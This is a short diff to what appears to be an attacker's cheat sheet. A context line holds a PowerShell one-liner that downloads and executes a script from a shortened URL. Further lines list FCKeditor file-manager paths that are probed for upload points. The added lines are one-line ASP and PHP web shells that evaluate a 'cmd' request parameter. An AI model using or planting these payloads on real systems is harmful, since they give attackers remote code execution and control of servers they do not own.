@@ -57,3 +57,7 @@ powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI')
 /FCKeditor/editor/filemanager/upload/test.html
 /fckeditor/editor/filemanager/browser/default/connectors/test.html
 /fckeditor/editor/filemanager/connectors/test.html
+
+ASPX: <%@ PageLanguage="Jscript"%>
+ASP : <%eval(Request.Item["cmd"],"unsafe");%>
+PHP: <?php @eval($_REQUEST["cmd"]); ?>
